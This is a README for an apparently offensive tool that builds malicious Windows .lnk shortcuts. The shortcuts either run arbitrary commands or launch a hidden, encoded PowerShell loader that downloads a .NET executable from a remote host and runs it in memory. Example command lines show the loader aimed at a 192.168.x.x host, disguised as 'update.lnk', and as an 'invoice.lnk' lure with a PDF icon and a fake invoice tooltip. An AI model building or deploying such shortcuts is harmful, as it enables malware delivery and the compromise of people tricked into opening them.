# lnk

Windows `.lnk` shortcut builder.

- **Command mode** (`--cmd`) — runs arbitrary command via `cmd.exe /c`
- **In-memory mode** (`--url`) — PowerShell one-liner downloads .NET `.exe` and executes via `[Reflection.Assembly]::Load` (no disk write)

Base64-encoded PowerShell (`-w hidden -ep bypass -nop -enc`), customizable icon + tooltip + window mode (default: Minimized).

## Example

```bash
# In-memory loader (pair with loader/ output)
python3 build_lnk.py --url http://192.168.x.x/loader.exe -o update.lnk

# Arbitrary command
python3 build_lnk.py --cmd "calc.exe" -o calc.lnk

# x86 .NET assembly
python3 build_lnk.py --url http://192.168.x.x/loader.exe --x86 -o update.lnk

# Social engineering (PDF icon + tooltip)
python3 build_lnk.py --url http://192.168.x.x/loader.exe -o invoice.lnk \
    --desc "Q1 2026 Invoice" --icon "C:\\Windows\\System32\\imageres.dll" --icon-index 2
```

## Requirements

```bash
pip install pylnk3
```
